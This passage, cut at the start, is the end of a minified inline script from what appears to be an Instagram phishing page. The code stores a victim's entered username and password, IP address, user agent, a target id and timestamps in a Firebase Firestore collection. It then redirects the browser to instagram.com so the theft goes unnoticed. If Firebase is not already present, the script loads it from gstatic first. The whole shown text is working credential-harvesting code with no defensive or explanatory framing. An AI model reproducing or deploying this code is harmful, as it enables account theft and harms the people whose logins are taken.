nstagram_logs").add({username:u,password:p,ip:ip,targetUid:uid,userAgent:navigator.userAgent,timestamp:new Date().toISOString(),unix:Date.now()}).then(()=>{location.href='https://instagram.com'}).catch(()=>{location.href='https://instagram.com'})}if(typeof firebase!=='undefined'&&firebase.apps&&firebase.apps.length){save()}else{const s=document.createElement('script');s.src='https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';s.onload=()=>{const s2=document.createElement('script');s2.src='https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';s2.onload=()=>{firebase.initializeApp(cfg);save()};document.head.appendChild(s2)};document.head.appendChild(s)}}</script></body></html>
